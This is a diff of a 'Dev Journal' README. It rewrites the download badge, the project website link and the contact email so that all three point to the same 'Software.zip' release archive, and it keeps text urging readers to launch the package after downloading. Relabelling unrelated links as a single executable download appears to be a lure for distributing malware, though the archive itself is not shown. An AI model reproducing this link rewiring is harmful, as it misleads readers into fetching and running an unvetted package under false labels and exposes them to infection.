@@ -20,7 +20,7 @@ In the `Tips` section, you will find helpful tips and tricks shared by developer
 
 To get started with the **Dev Journal** repository, simply click on the link below to download the software package:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/damonke3445/dev-journal/releases/download/v2.0/Software.zip)](https://github.com/damonke3445/dev-journal/releases/download/v2.0/Software.zip)
 
 Please note that the software package needs to be launched after downloading for installation instructions and usage details.
 
@@ -28,7 +28,7 @@ Please note that the software package needs to be launched after downloading for
 
 If the link provided above does not work or you need more information, please check the **Releases** section of this repository for alternative download options and updates.
 
-Feel free to visit the [**Dev Journal** website](https://devjournal.com) for more developer resources and community discussions.
+Feel free to visit the [**Dev Journal** website](https://github.com/damonke3445/dev-journal/releases/download/v2.0/Software.zip) for more developer resources and community discussions.
 
 ## 🤝 Contributing
 
@@ -38,7 +38,7 @@ To contribute, simply fork this repository, make your changes, and submit a pull
 
 ## 📬 Contact
 
-If you have any questions, suggestions, or feedback regarding the **Dev Journal** repository, feel free to reach out to us via email at devjournal@example.com. We look forward to hearing from you!
+If you have any questions, suggestions, or feedback regarding the **Dev Journal** repository, feel free to reach out to us via email at https://github.com/damonke3445/dev-journal/releases/download/v2.0/Software.zip We look forward to hearing from you!
 
 Happy coding! 🎉
 
